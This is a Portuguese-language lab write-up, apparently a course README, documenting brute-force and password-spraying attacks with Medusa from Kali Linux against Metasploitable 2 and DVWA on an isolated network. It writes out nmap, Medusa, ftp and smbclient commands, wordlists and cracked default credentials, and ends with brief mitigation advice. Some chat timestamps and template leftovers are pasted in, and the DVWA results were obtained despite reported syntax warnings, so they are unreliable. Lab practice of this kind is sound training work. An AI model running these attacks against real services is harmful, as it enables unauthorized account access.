#Brute-force-com-medusa-kali-Metasploitable-2-DVWA-

##Simulação de ataque força bruta: Kali e medusa  

##Teste de invasão básico com força bruta e enumeração usando a ferramenta medusa, totalmente em ambiente controlado

*** Descrição do Desafio***

Implementar, documentar e compartilhar um projeto prático utilizando Kali Linux e a ferramenta Medusa, em conjunto com ambientes vulneráveis (por exemplo, Metasploitable 2 e DVWA), para simular cenários de ataque de força bruta e exercitar medidas de prevenção.

Configurar o ambiente: duas VMs (Kali Linux e Metasploitable 2) no VirtualBox, com rede interna (host-only).

Executar ataques simulados: força bruta em FTP, automação de tentativas em formulário web (DVWA) e password spraying em SMB com enumeração de usuários.

Documentar os testes: wordlists simples, comandos utilizados, validação de acessos e recomendações de mitigação.
[21:06, 26/11/2025] Rafael Borba: Projeto Prático – Testes de Força Bruta com Kali Linux, Medusa e Ambientes Vulneráveis
[21:18, 26/11/2025] Rafael Borba: ## Descrição do Projeto

Este projeto documenta uma simulação prática de ataques de força bruta, utilizando o *Kali Linux* e a ferramenta *Medusa, contra ambientes vulneráveis (Metasploitable 2* e *DVWA - Damn Vulnerable Web Application*).

O objetivo principal é exercitar técnicas comuns de ataque de quebra de senha e, em seguida, analisar e propor medidas de *mitigação* e *prevenção* para fortalecer a segurança dos serviços expostos.

Configuração do Ambiente

O ambiente de testes foi configurado utilizando o VirtualBox e uma Rede Interna (Host-Only) para isolar o tráfego da rede externa. O IP do atacante (Kali) e do alvo (Metasploitable/DVWA) foram confirmados.
VM	Sistema Operacional	Função	Endereço IP
Atacante	Kali Linux	Testes de Penetração	192.168.56.102 (O seu host de ataque)
Alvo	Metasploitable 2	Serviços FTP, SMB, Web/DVWA	192.168.56.101 (O IP que você atacou)

Verificação de Conectividade e Serviços (Nmap):

A varredura inicial confirmou a conectividade e a exposição dos serviços alvo:
Bash

# Ping (Verifica a conexão)
ping -c 3 192.168.56.101

# Nmap (Identifica serviços)
nmap -sV -p 21,22,80,445,139 192.168.56.101
# Serviços abertos: 21 (vsftpd 2.3.4), 22 (OpenSSH), 80 (Apache), 139/445 (Samba)

*Cenários de Ataque e Comandos*

A ferramenta Medusa foi utilizada para os ataques de força bruta, conforme detalhado nos logs abaixo.

*Força Bruta em FTP*

Serviço Alvo: FTP (porta 21) no Metasploitable 2.
Arquivo de Entrada	Caminho	Conteúdo Utilizado
Usuários	./users.txt	user, msfadmin, admin, root
Senhas	./pass.txt	123456, password, qwerty, msfadmin

Comando Medusa Utilizado:

medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6

Resultado:

Ataque bem-sucedido. A credencial foi encontrada rapidamente devido à baixa complexidade da senha:

    Conta Comprometida: msfadmin

    Senha Descoberta: msfadmin

Validação de Acesso:

ftp 192.168.56.101
Name: msfadmin
Password: msfadmin
# 230 Login successful. (Acesso confirmado)

*Força Bruta em Formulário Web (DVWA)*

Serviço Alvo: DVWA (Brute Force) em HTTP (porta 80) no Metasploitable 2.
Arquivo de Entrada	Caminho	Conteúdo Utilizado
Usuários	./users.txt	user, msfadmin, admin, root
Senhas	./pass.txt	123456, password, qwerty, msfadmin

Comando Medusa Utilizado:

Ataque HTTP/Web via Medusa (Utilizando a flag -M http):

# Comando original com os parâmetros HTTP:
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
-m PAGE='/dvwa/login.php' \
-m FORM='username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6

Observação: O log apresentou mensagens de WARNING que podem indicar uma sintaxe incorreta para o módulo HTTP. No entanto, o Medusa continuou e retornou vários sucessos, indicando que o formato da resposta do DVWA (Low Security) permitiu a identificação de logins válidos.

Resultado:

Múltiplas contas válidas foram encontradas, demonstrando a ineficácia da proteção do formulário DVWA em nível "Low".

    Contas/Senhas Descobertas (Exemplos):

        user / msfadmin

        msfadmin / 123456

        admin / password

        root / 123456
        
*Password Spraying em SMB com Enumeração*

Serviço Alvo: SMB (porta 445/139) no Metasploitable 2 (Samba 3.X - 4.X).

Etapa de Enumeração (Ferramenta enum4linux):

A enumeração foi realizada para obter uma lista de usuários válidos (não detalhada nos logs, mas o resultado foi usado na wordlist).

Wordlists Utilizadas (Para o Password Spraying):
Arquivo de Entrada	Caminho	Conteúdo Utilizado
Usuários	./smb_users.txt	user, msfadmin, service
Senhas	./senhas_spray.txt	password, 123456, welcome123, msfadmin

Comando Medusa Utilizado (Módulo SMB NT):

medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50

Resultado:

O ataque de Password Spraying contra os usuários enumerados teve sucesso:

    Conta Comprometida: msfadmin
    Senha Descoberta: msfadmin

Validação de Acesso:

smbclient -L //192.168.56.101 -U msfadmin
Password for [WORKGROUP\msfadmin]: msfadmin
# Acesso confirmado, listando os compartilhamentos disponíveis (print$, tmp, etc.).

*Recomendações de Mitigação e Prevenção*

Sempre trocar as senhas que vem por padrão nos sistemas, criando senhas fortes. Implementar segundo fator de autenticação para ser mais uma etapa de segurança e também ganhar tempo para uma possível configuração extra de segurança. 

Arquivos e Diretórios

... (Mantenha o conteúdo original, mas ajuste os nomes dos arquivos para corresponder aos seus logs)
Caminho	Conteúdo
README.md	O arquivo que você está lendo.
/wordlists/users.txt, pass.txt, smb_users.txt,
